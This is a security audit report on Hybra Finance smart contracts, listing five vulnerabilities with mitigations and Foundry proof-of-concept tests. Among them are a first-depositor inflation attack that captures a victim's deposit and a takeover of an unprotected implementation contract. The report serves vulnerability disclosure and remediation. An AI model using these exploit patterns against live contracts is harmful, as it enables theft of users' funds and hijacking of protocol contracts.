# [Hybra Report](https://code4rena.com/reports/2025-10-hybra-finance)

| ID | Title |
|:--:|:---|
| [M-1](#m-1-rollover-rewards-are-permanently-lost-due-to-flawed-rewardrate-calculation) | Rollover rewards are permanently lost due to flawed `rewardRate` calculation |
| [M-2](#m-2-inflation-attack-on-calculateshares-allows-first-depositor-to-steal-funds) | Inflation attack on `calculateShares()` allows first depositor to steal funds |
| [L-1](#l-1-missing-_disableinitializers-allows-attacker-to-take-ownership-of-implementation-contracts) | Missing `_disableInitializers()` allows attacker to take ownership of implementation contracts |
| [L-2](#l-2-misconfigured-timing-constants-cause-incorrect-withdraw-and-lock-durations) | Misconfigured Timing Constants Cause Incorrect Withdraw and Lock Durations |
| [L-3](#l-3-the-last-user-cannot-withdraw-resulting-in-permanent-asset-lock) | The Last User Cannot Withdraw, Resulting in Permanent Asset Lock |

# [M-1] Rollover rewards are permanently lost due to flawed `rewardRate` calculation
https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/CLGauge/GaugeCL.sol#L256

## Finding description and impact

The `notifyRewardAmount()` function miscalculates the `rewardRate` when a new epoch begins, causing `rollover` rewards from previous epochs to be permanently lost.

When `block.timestamp >= _periodFinish`, the function adds both the new `rewardAmount` and the previous epoch’s `clPool.rollover()` to form the `totalRewardAmount`. However, the `rewardRate` is derived only from `rewardAmount`, ignoring the rollover portion:
```solidity
// @audit The total amount to be reserved includes rollover...
uint256 totalRewardAmount = rewardAmount + clPool.rollover();
if (block.timestamp >= _periodFinish) {
    // @audit but the rate calculation completely ignores the rollover.
    rewardRate = rewardAmount / epochTimeRemaining;
    
    // @audit The pool is synced with a CORRECT reserve but an INCORRECTLY LOW rate.
    clPool.syncReward({
        rewardRate: rewardRate,
        rewardReserve: totalRewardAmount, // Correct total
        periodFinish: epochEndTimestamp
    });
}
```

This mismatch means the pool receives the full reserve (new + rollover) but emits rewards too slowly to deplete it. The rollover portion remains stranded, and when the next epoch begins, it is overwritten and effectively erased.
The logic in the `else` branch fails to correct this issue; instead, it perpetuates the error. The updated rate is calculated using the old, already flawed `rewardRate`, ensuring that once `rollover` funds are stranded, they can never be reclaimed through subsequent reward notifications.

### Impact

1. Permanent Loss of Funds: Unclaimed rollover rewards are locked in the contract and cannot be recovered.
2. Reduced LP Yields: Liquidity providers earn less than intended, as part of their entitled rewards never distribute.
3. Protocol Resource Waste: Tokens from the treasury or partners are effectively burned, wasting incentive funds.

## Recommended mitigation steps

The `rewardRate` calculation should include the `rollover` amount to ensure the emission rate matches the total rewards available for distribution. This change guarantees that all `rollover` rewards are correctly accounted for and eventually distributed.
In `GaugeCL.sol`:
```diff
-   rewardRate = rewardAmount / epochTimeRemaining;
+   rewardRate = totalRewardAmount / epochTimeRemaining;
    clPool.syncReward({
        rewardRate: rewardRate,
        rewardReserve: totalRewardAmount,
        periodFinish: epochEndTimestamp })
```

## POC
The following test reproduces the issue in three steps:
1. Add `100 ether` as rewards, then warp time forward so the entire amount becomes rollover.
2. Add `50 ether` as new rewards, triggering the flawed logic. The CLPool’s reserve is now `150 ether`, but the rate only allows `50 ether` to be distributed.
3. After another time warp and update, the pool’s accounted reserve is ~50 ether, while the actual gauge balance is `150 ether`. The ~100 ether difference represents the permanently lost rewards.

- Copy the test below into `cl/test/C4PoC.t.sol`, then run: `forge test --mt test_PoC_RolloverRewardsAreLost -vv`
```solidity
import "forge-std/Test.sol";
import "forge-std/console2.sol"; // Using console2 for better compatibility
import {C4PoCTestbed} from "./C4PoCTestbed.t.sol";

import {MockERC20} from "contracts/mocks/MockERC20.sol";
import {ICLPool} from "contracts/core/interfaces/ICLPool.sol";
import {INonfungiblePositionManager} from "contracts/periphery/interfaces/INonfungiblePositionManager.sol";


// =========================================================================================
// MOCK CONTRACT FOR THE POC
// Purpose: This mock contract isolates the specific vulnerable function from the full
// CLGauge contract. This allows for a focused test that is easy to understand and audit.
// =========================================================================================

contract MockVulnerableCLGauge_Rollover {
    ICLPool public immutable clPool;
    MockERC20 public immutable rewardToken;
    address public immutable DISTRIBUTION;

    uint256 public _periodFinish;
    uint256 public rewardRate;

    constructor(address _clPool, address _rewardToken, address _distribution) {
        clPool = ICLPool(_clPool);
        rewardToken = MockERC20(_rewardToken);
        DISTRIBUTION = _distribution;
    }

    function _epochNext(uint256 timestamp) internal pure returns (uint256) {
        uint256 week = 604800;
        return ((timestamp / week) + 1) * week;
    }
    
    // THE VULNERABLE FUNCTION: A direct copy of the buggy logic from the original CLGauge contract
    function notifyRewardAmount(address token, uint256 rewardAmount) external {
        require(msg.sender == DISTRIBUTION, "Only distribution");
        require(token == address(rewardToken), "Invalid reward token");
        clPool.updateRewardsGrowthGlobal();
        uint256 epochTimeRemaining = _epochNext(block.timestamp) - block.timestamp;
        uint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;
        uint256 totalRewardAmount = rewardAmount + clPool.rollover();
        if (block.timestamp >= _periodFinish) {

            // `rewardRate` is calculated using ONLY the new `rewardAmount`.
            // It completely ignores the `clPool.rollover()` amount that was just calculated.
            rewardRate = rewardAmount / epochTimeRemaining;

            // The pool is synced with a CORRECT `rewardReserve` (including rollover)
            // but an INCORRECTLY LOW `rewardRate`. This mismatch is the root cause of the fund loss.
            clPool.syncReward({
                rewardRate: rewardRate,
                rewardReserve: totalRewardAmount,
                periodFinish: epochEndTimestamp
            });
        } else {
            revert("PoC focuses on the new reward period scenario");
        }
        rewardToken.transferFrom(DISTRIBUTION, address(this), rewardAmount);
        _periodFinish = epochEndTimestamp;
    }
}

contract C4PoC is C4PoCTestbed {
    function setUp() public override {
        super.setUp();
    }

    function test_PoC_RolloverRewardsAreLost() public {
        // Step 1: Create a CL pool and necessary mock contracts for the test.
        address token0 = WETH < USDC ? WETH : USDC;
        address token1 = WETH < USDC ? USDC : WETH;
        
        uint256 amount0ToMint = 4000 * 1e6;
        uint256 amount1ToMint = 1 ether;

        MockERC20(token0).mint(deployer, amount0ToMint);
        MockERC20(token1).mint(deployer, amount1ToMint);
        
        vm.prank(deployer);
        MockERC20(token0).approve(address(nonfungiblePositionManager), type(uint256).max);
        vm.prank(deployer);
        MockERC20(token1).approve(address(nonfungiblePositionManager), type(uint256).max);
        
        vm.startPrank(deployer);
        nonfungiblePositionManager.mint(INonfungiblePositionManager.MintParams({
                token0: token0, token1: token1, tickSpacing: 2000,
                tickLower: -200000, tickUpper: 200000,
                amount0Desired: amount0ToMint,
                amount1Desired: amount1ToMint,
                amount0Min: 0, amount1Min: 0,
                recipient: deployer, deadline: block.timestamp,
                sqrtPriceX96: 2505414483750479311864138015344742
            }));
        vm.stopPrank();

        ICLPool clPool = ICLPool(poolFactory.getPool(token0, token1, 2000));
        assertTrue(address(clPool) != address(0), "Pool creation failed");

        // Step 2: Deploy our mock gauge and authorize it on the pool.
        // We use `vm.store` to bypass complex authorization mechanisms and directly
        // write our mock gauge's address into the pool's `gauge` storage slot (slot 3).
        MockERC20 rewardToken = new MockERC20("RewardToken", "RWD", 18);
        address rewardDistributor = makeAddr("rewardDistributor");
        MockVulnerableCLGauge_Rollover mockGauge = new MockVulnerableCLGauge_Rollover(
            address(clPool), address(rewardToken), rewardDistributor
        );
        
        bytes32 GAUGE_STORAGE_SLOT = bytes32(uint256(3));
        vm.store(
            address(clPool),
            GAUGE_STORAGE_SLOT,
            bytes32(uint256(uint160(address(mockGauge))))
        );
        assertEq(clPool.gauge(), address(mockGauge));

        uint256 reward1_to_be_lost = 100 ether;
        uint256 reward2_retained = 50 ether;
        rewardToken.mint(rewardDistributor, reward1_to_be_lost + reward2_retained);
        vm.prank(rewardDistributor);
        rewardToken.approve(address(mockGauge), type(uint256).max);

        // Step 3: EPOCH 1: Create a rollover situation
        // PRE-CONDITION: The pool has 0 staked liquidity, which is essential for this PoC
        // as it guarantees 100% of the undistributed reward will become rollover.
        vm.prank(rewardDistributor);
        mockGauge.notifyRewardAmount(address(rewardToken), reward1_to_be_lost);
        vm.warp(clPool.periodFinish() + 1);

        // Distribute 50 ether, triggering the vulnerability.
        vm.prank(rewardDistributor);
        mockGauge.notifyRewardAmount(address(rewardToken), reward2_retained);

        // Advance time and notify with 0. This finalizes the loss.
        vm.warp(clPool.periodFinish() + 1);
        vm.prank(rewardDistributor);
        mockGauge.notifyRewardAmount(address(rewardToken), 0);
        
        // Step 4: ASSERTION & PROOF
        uint256 finalGaugeBalance = rewardToken.balanceOf(address(mockGauge));
        uint256 finalPoolReserve = clPool.rewardReserve();
        uint256 lostAmount = finalGaugeBalance - finalPoolReserve;
        
        console2.log("--- Rollover Bug PoC Results ---");
        console2.log("Physical Token Balance in Gauge:", finalGaugeBalance);
        console2.log("Accounted Reward Reserve in Pool:", finalPoolReserve);
        console2.log("Amount of Stuck/Lost Tokens:", lostAmount);

        // Core Proof: The pool's final accounted reserve should only reflect the SECOND reward.
        // The first 100 ether reward has vanished from its books.
        uint256 dustTolerance = 1 ether; // A generous tolerance of 1 full token
        assertApproxEqAbs(
            finalPoolReserve, 
            reward2_retained, 
            dustTolerance, 
            "BUG: Pool reserve should be approximately 50 ether"
        );
        
        // Final check: The amount of lost funds must equal the first reward.
        assertApproxEqAbs(
            lostAmount, 
            reward1_to_be_lost, 
            dustTolerance, 
            "BUG: The lost amount should be approximately 100 ether"
        );
    }
}
```

# [M-2] Inflation attack on `calculateShares()` allows first depositor to steal funds
https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L232
https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L492

## Finding description and impact

The `calculateShares()` function, which computes the amount of `gHYBR` shares to be minted for a deposit, is vulnerable to manipulation due to integer division. An initial depositor can create a state where `totalAssets` is significantly larger than `totalSupply`. This is achieved by making a minimal initial deposit, followed by a donation of HYBR that is then compounded into `totalAssets` via the public `receivePenaltyReward()` function.
For subsequent users, if their deposit amount is less than the `totalAssets / totalSupply` ratio, the share calculation `(amount * totalSupply) / totalAssets` will truncate to zero. The deposit function proceeds to mint zero shares, but does not revert the initial transfer of the user's HYBR. The user's funds are thus added to the vault's assets, while they receive no shares in return. These assets are then controlled by the initial depositor, who holds all outstanding shares.

### Impact

The vulnerability leads to a direct loss of funds for affected users. It allows an initial depositor to capture all subsequent deposits under a certain threshold. This breaks the core deposit mechanism and can lead to significant, irreversible fund loss for users.

## Recommended mitigation steps

1. Add Access Control to `receivePenaltyReward()`: This function is a permissionless vector for inflating totalAssets. Its visibility must be restricted.
```diff
-   function receivePenaltyReward(uint256 amount) external {
+   function receivePenaltyReward(uint256 amount) external onlyOperator {
```

2. Add a Zero-Share Check in `deposit()`: As a defense-in-depth measure, the deposit function must verify that a deposit results in a non-zero amount of shares before minting.
```diff
// In deposit()
    uint256 shares = calculateShares(amount);
+   require(shares > 0, "GrowthHYBR: insufficient amount for shares");
    _mint(recipient, shares);
```

## POC
1. An attacker and a victim are funded with HYBR.
2. The attacker deposits `1 wei` HYBR to mint 1 share, then donates `100 HYBR` and calls the public `receivePenaltyReward()` to lock it, skewing the asset/share ratio.
3. The victim deposits `50 HYBR`.
4. Victim's `HYBR` balance decreases by 50, but their `gHYBR` share balance remains `0`. Attacker retains effective control of all vault assets.

- Copy the following test into `ve33/test/C4PoC.t.sol`, then run the command: `forge test --mt test_PoC_GrowthHybr_InflationAttack -vv`
```solidity
function test_PoC_GrowthHybr_InflationAttack() public {
        // -------------------------------------------------------------------------------------
        // 1. SETUP: Prepare attacker and victim with starting funds.
        // -------------------------------------------------------------------------------------
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        
        uint256 fundingAmount = 1000e18; // 1000 HYBR for each.
        hybr.transfer(attacker, fundingAmount);
        hybr.transfer(victim, fundingAmount);

        vm.startPrank(attacker);
        hybr.approve(address(gHybr), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(victim);
        hybr.approve(address(gHybr), type(uint256).max);
        vm.stopPrank();

        console.log("Attacker initial HYBR:", hybr.balanceOf(attacker));
        console.log("Victim initial HYBR:  ", hybr.balanceOf(victim));

        // -------------------------------------------------------------------------------------
        // 2. POISON: Attacker skews the asset/share ratio.
        // -------------------------------------------------------------------------------------
        // 2.1 - Attacker deposits a tiny amount to be the first shareholder.
        uint256 attackerInitialDeposit = 1; // Just 1 wei.
        vm.prank(attacker);
        gHybr.deposit(attackerInitialDeposit, attacker);

        // 2.2 - Attacker donates a larger amount to inflate assets without minting shares.
        uint256 inflationAmount = 100e18; // 100 HYBR.
        vm.prank(attacker);
        hybr.transfer(address(gHybr), inflationAmount);
        
        // Attacker uses the public `receivePenaltyReward` to lock the donated funds.
        vm.prank(attacker);
        gHybr.receivePenaltyReward(inflationAmount);

        console.log("--- Vault Poisoned ---");
        console.log("Vault totalAssets:", gHybr.totalAssets());
        console.log("Vault totalSupply:", gHybr.totalSupply());
        console.log("Attacker gHYBR shares:", gHybr.balanceOf(attacker));
        
        // -------------------------------------------------------------------------------------
        // 3. ATTACK: Victim deposits funds and gets nothing in return.
        // -------------------------------------------------------------------------------------
        uint256 victimDepositAmount = 50e18; // Victim deposits 50 HYBR.
        
        uint256 victimHybrBefore = hybr.balanceOf(victim);
        uint256 victimSharesBefore = gHybr.balanceOf(victim);
        vm.prank(victim);
        gHybr.deposit(victimDepositAmount, victim);

        uint256 victimHybrAfter = hybr.balanceOf(victim);
        uint256 victimSharesAfter = gHybr.balanceOf(victim);
        
        assertEq(victimSharesAfter, victimSharesBefore, "Victim received shares!"); // Should be 0 new shares.
        console.log("Victim HYBR Before:", victimHybrBefore);
        console.log("Victim HYBR After: ", victimHybrAfter);
        console.log("Victim gHYBR Before:", victimSharesBefore);
        console.log("Victim gHYBR After: ", victimSharesAfter);

        // -------------------------------------------------------------------------------------
        // 4. VERIFY PROFIT: Attacker now controls the victim's funds.
        // -------------------------------------------------------------------------------------
        uint256 finalTotalAssets = attackerInitialDeposit + inflationAmount + victimDepositAmount;

        assertEq(gHybr.totalAssets(), finalTotalAssets, "Vault assets mismatch");
        assertEq(gHybr.totalSupply(), attackerInitialDeposit, "Total supply should be unchanged by victim's deposit");

        console.log("--- Final State ---");
        console.log("Attacker now controls all vault assets:", gHybr.totalAssets());
        console.log("...with only", gHybr.balanceOf(attacker), "wei of shares.");
    }
```

# [L-1] Missing `_disableInitializers()` allows attacker to take ownership of implementation contracts

## Finding description and impact

Several upgradeable contracts are missing `_disableInitializers()` in their constructors:

1. [GaugeManager.sol](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/GaugeManager.sol#L71)
2. [MinterUpgradeable.sol](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/MinterUpgradeable.sol#L49)
3. [VoterV3.sol](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/VoterV3.sol#L45)
4. [GaugeFactoryCL.sol](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/CLGauge/GaugeFactoryCL.sol#L30)
5. [VeArtProxyUpgradeable.sol](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/VeArtProxyUpgradeable.sol#L12) - This one is out of scope

Upgradeable contracts that do not call `_disableInitializers()` in their constructors leave their implementation contracts unprotected. Attackers can directly call the `initialize()` function on the implementation (not through the proxy), which allows them to become the owner or set arbitrary configuration values. This results in ownership takeover and potential corruption of the protocol’s core logic contracts.

While the currently deployed proxies remain unaffected (since storage is separate), the compromised implementation contract can be reused in future deployments or upgrades, introducing a hidden and persistent attack vector.

### Impact
This breaks the integrity of upgrade and deployment processes, making the system unsafe for future maintenance.

- Attacker can initialize the implementation contract with arbitrary parameters.
- Ownership of core logic (e.g.,`GaugeManager`, `MinterUpgradeable`, `VoterV3`) can be taken over.
- Future proxy deployments or upgrades could be compromised if the polluted implementation is reused.

## Recommended mitigation steps

Add `_disableInitializers()` to the constructor of all upgradeable contracts:

```solidity
constructor() {
    _disableInitializers();
}
```

## POC
The test reads the GaugeManager implementation address from the proxy, calls `initialize()` directly on the implementation, and verifies that the implementation owner changes from `address(0)` to the attacker address.

- Copy the following test into `ve33/test/C4PoC.t.sol`, then run the command: `forge test --mt test_PoC_ImplementationHijack -vv`
```solidity
import "../contracts/GaugeManager.sol";

function test_PoC_ImplementationHijack() public {
        // 1. ARRANGE: Get the address of the GaugeManager's implementation contract.
        bytes32 IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address gaugeManagerImplAddr = address(uint160(uint256(vm.load(address(gaugeManager), IMPLEMENTATION_SLOT))));
        GaugeManager gaugeManagerImplementation = GaugeManager(gaugeManagerImplAddr);

        console.log("GaugeManager Proxy Address:", address(gaugeManager));
        console.log("GaugeManager Implementation Address:", gaugeManagerImplAddr);
        
        // Pre-condition check: The implementation's owner should be address(0).
        assertEq(gaugeManagerImplementation.owner(), address(0), "Initial implementation owner should be zero");
        console.log("Owner of implementation BEFORE attack:", gaugeManagerImplementation.owner());

        // 2. ACT: The attacker (this test contract) calls `initialize()` directly on the implementation.
        console.log("Attacker (this contract) is:", address(this));
        gaugeManagerImplementation.initialize(
            address(votingEscrow),
            address(tokenHandler),
            address(gaugeFactory),
            address(gaugeFactoryCL),
            address(thenaFiFactory),
            clPoolFactory,
            address(permissionsRegistry),
            clNonfungiblePositionManager
        );

        // 3. ASSERT: The owner of the implementation contract is now the attacker.
        address newOwner = gaugeManagerImplementation.owner();
        assertEq(newOwner, address(this), "Attacker should now own the implementation contract");
        
        console.log("Owner of implementation AFTER attack:", newOwner);
        
        // To further prove it, the attacker can now call a function with the `onlyOwner` modifier.
        // We will call `transferOwnership` which is inherited from OwnableUpgradeable and only checks the owner.
        address newOwnerRecipient = makeAddr("new_owner_recipient");
        gaugeManagerImplementation.transferOwnership(newOwnerRecipient);
        
        // Final check: The owner should now be the new recipient.
        assertEq(gaugeManagerImplementation.owner(), newOwnerRecipient, "Ownership transfer should succeed");
    }
```

# [L-2] Misconfigured Timing Constants Cause Incorrect Withdraw and Lock Durations
https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L23

## Finding description and impact

The timing constants in `GrowthHYBR` don’t match their documented durations, leading to incorrect withdrawal and lock periods.
The lock period is described as 12–24 hours but actually limited to 1–4 hours. Similarly, “5 days” and “1 day” constants represent only 20 and 5 minutes.
```solidity
// Lock period for new deposits (configurable between 12-24 hours)
uint256 public transferLockPeriod = 24 hours;
uint256 public constant MIN_LOCK_PERIOD = 1 minutes;
uint256 public constant MAX_LOCK_PERIOD = 240 minutes;
uint256 public head_not_withdraw_time = 1200; // 5days
uint256 public tail_not_withdraw_time = 300; // 1day
```

These constants are directly used in withdrawal time checks. Because the values are misconfigured, the withdraw window opens and closes much earlier than intended, breaking the expected epoch timing and lock behavior.
```solidity
require(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, "Cannot withdraw yet");
```

### Impact

This issue disables the intended time locks that regulate capital flow and epoch stability. Users can withdraw much earlier than intended, which:
1. Breaks the intended ve-token lock and unlock schedule.
2. Allows short-term deposits to gain rewards or voting power with minimal commitment.
3. Increases liquidity volatility and undermines the protocol’s governance model.
4. Misleads users who expect multi-day locks based on documentation.

## Recommended mitigation

Update the constants to reflect the documented durations (5 days / 1 day, 12–24 hours) or correct the comments to match the actual configuration.
The former is strongly recommended to align the contract with its intended economic model.
```solidity
// Recommended Change
uint256 public head_not_withdraw_time = 5 days;
uint256 public tail_not_withdraw_time = 1 days;
```

## POC

The following test demonstrates that a user can withdraw their funds far earlier than the documented 5-day lock period due to misconfigured timing constants.
After warping just past the actual configured duration (~20 minutes), the withdrawal succeeds unexpectedly, confirming that the multi-day lock is not enforced.

- Copy the following test into `ve33/test/C4PoC.t.sol`, then run: `forge test --mt test_PoC_IncorrectWithdrawTimeWindow -vv`
```solidity
import "forge-std/Test.sol";
import {C4PoCTestbed} from "./C4PoCTestbed.t.sol";

import {HybraTimeLibrary} from "../contracts/libraries/HybraTimeLibrary.sol";

contract C4PoC is C4PoCTestbed {
    function setUp() public override {
        super.setUp();
    }

    function test_PoC_IncorrectWithdrawTimeWindow() public {
        // -------------------------------------------------------------------------------------
        // 1. ARRANGE: Two users deposit funds to ensure the withdrawing user is not the last one.
        // -------------------------------------------------------------------------------------
        address userA = makeAddr("userA"); // The user who will exploit the timing flaw.
        address userB = makeAddr("userB"); // The user who remains, preventing the ZW error.

        uint256 depositAmount = 100e18;
        hybr.transfer(userA, depositAmount);
        hybr.transfer(userB, depositAmount);

        // User A deposits
        vm.startPrank(userA);
        hybr.approve(address(gHybr), depositAmount);
        gHybr.deposit(depositAmount, userA);
        vm.stopPrank();

        // User B deposits
        vm.startPrank(userB);
        hybr.approve(address(gHybr), depositAmount);
        gHybr.deposit(depositAmount, userB);
        vm.stopPrank();

        // Grant the necessary permission for gHybr to perform splits.
        votingEscrow.toggleSplit(address(gHybr), true);

        // -------------------------------------------------------------------------------------
        // 2. ACT: Exploit the timing vulnerability.
        // -------------------------------------------------------------------------------------
        uint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);
        
        // The actual lock is ~20 minutes (1200s). We warp to just after it expires.
        uint256 actualLockDuration = gHybr.head_not_withdraw_time();
        uint256 withdrawAttemptTime = epochStart + actualLockDuration + 1;
        vm.warp(withdrawAttemptTime);

        console.log(">> Evidence: Exploiting Incorrect Time Lock");
        console.log("   - Documented Lock Period: 5 days");
        console.log("   - Actual Lock Period:     %s seconds", actualLockDuration);
        console.log("   - Withdrawal Timestamp:   %s (just after actual lock expired)", block.timestamp);
        console.log("   - This time is well within the documented 5-day lock and should have failed.");

        // User A attempts to withdraw all their shares. This call should now succeed.
        uint256 sharesToWithdraw = gHybr.balanceOf(userA);
        vm.prank(userA);
        gHybr.withdraw(sharesToWithdraw);

        // -------------------------------------------------------------------------------------
        // 3. ASSERT: Verify the withdrawal was successful.
        // -------------------------------------------------------------------------------------
        uint256 finalSharesA = gHybr.balanceOf(userA);

        assertEq(finalSharesA, 0, "BUG: User A's withdrawal succeeded when it should have been blocked!");

        console.log("\n>> Final Result: Withdrawal Succeeded!");
        console.log("   - User A's final gHYBR shares: %s", finalSharesA);
    }
}
```

# [L-3] The Last User Cannot Withdraw, Resulting in Permanent Asset Lock
https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L161
https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/VotingEscrow.sol#L1169

## Finding description and impact

The `withdraw()` function fails to handle the case where the last user withdraws all remaining assets. In this case, the calculated `remainingAmount` for the contract becomes zero. This zero value is then passed into the amounts array for the external call `IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts)`.

```solidity
uint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);
```

The `multiSplit()` function reverts when any of the split amounts equals zero, as it cannot create a zero-value veNFT. Consequently, when `remainingAmount == 0`, the entire withdrawal transaction reverts, preventing the last user from ever redeeming their assets.

```solidity
// In VotingEscrow.multiSplit
// Calculate total weight
        uint totalWeight = 0;
        for(uint i = 0; i < amounts.length; i++) {
            require(amounts[i] > 0, "ZW"); // Zero weight not allowed
            totalWeight += amounts[i];
        }
```

### Impact

The final user holding `gHYBR` shares is permanently unable to withdraw their funds. Since every `multiSplit()` call reverts and there is no fallback withdrawal path, the user’s assets remain locked indefinitely. This effectively results in a permanent loss of funds for the last depositor.

## Recommended mitigation steps

Implement a dedicated branch to handle full withdrawals. When `remainingAmount == 0`, call `multiSplit` with only two non-zero values (`userAmount` and `feeAmount`) instead of three. After a successful full withdrawal, set `veTokenId = 0` to indicate that the contract no longer holds any assets.

## POC
The following test demonstrates that when the last user attempts to withdraw, the transaction reverts due to a zero-amount split in multiSplit(). As a result, the user’s shares remain unburned and their funds locked permanently in the contract.

- Copy the code below into `ve33/test/C4PoC.t.sol` and run:: `forge test --mt test_PoC_LastUserCannotWithdraw -vv`
```solidity
import {HybraTimeLibrary} from "../contracts/libraries/HybraTimeLibrary.sol";
// ...
function test_PoC_LastUserCannotWithdraw() public {
        // 1. SETUP: Two users deposit, and we grant gHybr split permissions.
        address userA = makeAddr("userA");
        address userB = makeAddr("userB");

        uint256 depositAmount = 100e18;
        hybr.transfer(userA, depositAmount);
        hybr.transfer(userB, depositAmount);

        // User A deposits first
        vm.startPrank(userA);
        hybr.approve(address(gHybr), depositAmount);
        gHybr.deposit(depositAmount, userA);
        vm.stopPrank();

        // User B deposits second
        vm.startPrank(userB);
        hybr.approve(address(gHybr), depositAmount);
        gHybr.deposit(depositAmount, userB);

        vm.stopPrank();

        // The gHybr contract needs explicit permission to call multiSplit.
        // We grant this permission now as the deployer.
        votingEscrow.toggleSplit(address(gHybr), true);

        console.log("Vault totalAssets:", gHybr.totalAssets());
        console.log("userA gHYBR shares:", gHybr.balanceOf(userA));
        console.log("userB gHYBR shares:", gHybr.balanceOf(userB));

        // 2. CONDITION: Advance time and have the first user withdraw.
        uint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);
        uint256 headLock = gHybr.head_not_withdraw_time();
        vm.warp(epochStart + headLock + 1);

        uint256 sharesA = gHybr.balanceOf(userA);
        vm.prank(userA);
        gHybr.withdraw(sharesA);
        
        console.log("\n--- After First Withdrawal (Successful) ---");
        console.log("Vault totalAssets remaining:", gHybr.totalAssets());
        assertTrue(gHybr.balanceOf(userA) == 0, "User A should have no shares left");
        
        // 3. TRIGGER & ASSERTION: The last user attempts to withdraw, which should revert.
        uint256 sharesB_before = gHybr.balanceOf(userB);
        
        console.log("\n--- Attempting Final Withdrawal (Expected to Fail) ---");
        console.log("User B (last user) shares to withdraw:", sharesB_before);

        // This is the core of the PoC. We expect this call to revert.
        // The revert happens because `remainingAmount` will be 0, and `multiSplit` has a `require(amounts[i] > 0, "ZW")` check.
        vm.expectRevert(bytes("ZW")); 
        vm.prank(userB);
        gHybr.withdraw(sharesB_before);

        // 4. VERIFICATION: Verify that the user's funds are still locked.
        console.log("\n--- Final State Verification ---");
        uint256 sharesB_after = gHybr.balanceOf(userB);
        
        assertEq(sharesB_after, sharesB_before, "BUG: User B's shares should not have been burned");
        console.log("User B shares after failed tx:", sharesB_after);
        console.log("Last user's funds are confirmed to be locked.");
    }
```